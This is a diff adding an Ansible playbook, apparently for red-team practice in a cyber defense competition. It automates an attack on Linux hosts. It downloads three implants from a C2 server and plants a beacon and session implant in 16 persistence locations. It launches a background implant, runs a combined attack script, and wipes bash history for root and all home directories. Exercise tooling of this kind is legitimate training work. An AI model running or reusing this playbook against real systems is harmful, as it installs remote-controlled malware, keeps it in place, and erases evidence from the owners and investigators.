@@ -1,0 +1,98 @@
+---
+# CCDC Practice Session — 2026-09-03
+# Game plan: provision services → download implants → plant persistence → run all attack modules → clear history
+#
+# Usage:
+#   ansible-playbook -i inventory_2026-09-03.ini ccdc_2026-09-03_practice.yml
+#   ansible-playbook -i inventory_2026-09-03.ini ccdc_2026-09-03_practice.yml --limit 192.168.x.x
+#   ansible-playbook -i inventory_2026-09-03.ini ccdc_2026-09-03_practice.yml --tags setup
+#   ansible-playbook -i inventory_2026-09-03.ini ccdc_2026-09-03_practice.yml --check
+
+- name: CCDC Linux Attack Setup — 2026-09-03
+  hosts: linux_targets
+  become: yes
+  gather_facts: yes
+
+  tasks:
+
+    # ── Stage 1: Upload scripts ──────────────────────────────────────────────
+
+    - name: Create scripts staging directory
+      file:
+        path: "{{ scripts_dir }}"
+        state: directory
+        mode: '0700'
+      tags: [always]
+
+    - name: Upload all Linux setup scripts to target
+      copy:
+        src: "../General_Scripts/SetupScripts/linux/"
+        dest: "{{ scripts_dir }}/"
+        mode: '0755'
+      tags: [always]
+
+    - name: Upload runtime scripts to target
+      copy:
+        src: "../General_Scripts/RuntimeScripts/linux/"
+        dest: "{{ scripts_dir }}/runtime/"
+        mode: '0755'
+      tags: [always]
+
+    # ── Stage 2: Provision scored services (HTTP / Mail / Splunk) ────────────
+
+    - name: Provision HTTP / Mail / Splunk services
+      shell: bash {{ scripts_dir }}/CCDC_Linux_TargetSetup_HTTP_Mail_Splunk.sh
+      environment:
+        DEBIAN_FRONTEND: noninteractive
+      tags: [setup]
+
+    # ── Stage 3: Download implants from C2 server ────────────────────────────
+
+    - name: Download implants from C2 ({{ c2_server }}:{{ c2_port }})
+      get_url:
+        url: "http://{{ c2_server }}:{{ c2_port }}/{{ item }}"
+        dest: "/tmp/{{ item }}"
+        mode: '0755'
+        force: yes
+      loop:
+        - "{{ implant_beacon }}"
+        - "{{ implant_session_persist }}"
+        - "{{ implant_session_bg }}"
+      tags: [implants]
+
+    # ── Stage 4: Plant implants into 16 persistence locations ────────────────
+
+    - name: Plant beacon + session implant into 16 persistence locations
+      shell: |
+        bash {{ scripts_dir }}/CCDC_Linux_Persistence_PlantsVsZerodays.sh \
+          /tmp/{{ implant_beacon }} \
+          /tmp/{{ implant_session_persist }}
+      tags: [implants, persist]
+
+    # ── Stage 5: Launch background session implant (fire and forget) ─────────
+
+    - name: Launch background session implant ({{ implant_session_bg }})
+      shell: "nohup /tmp/{{ implant_session_bg }} > /dev/null 2>&1 &"
+      async: 10
+      poll: 0
+      tags: [implants]
+
+    # ── Stage 6: Run all COMBINED.sh attack modules ──────────────────────────
+    # echo "a" selects "run all" from the interactive menu non-interactively
+
+    - name: Run all COMBINED.sh attack modules
+      shell: echo "a" | bash {{ scripts_dir }}/CCDC_Linux_COMBINED.sh
+      environment:
+        DEBIAN_FRONTEND: noninteractive
+      timeout: 600
+      tags: [attack]
+
+    # ── Stage 7: Clear bash history on all targets ───────────────────────────
+
+    - name: Clear bash history on target
+      shell: |
+        history -c
+        truncate -s 0 /root/.bash_history
+        find /home -name ".bash_history" -exec truncate -s 0 {} \; 2>/dev/null
+        rm -f /tmp/.ccdc_combined_state
+      tags: [cleanup]
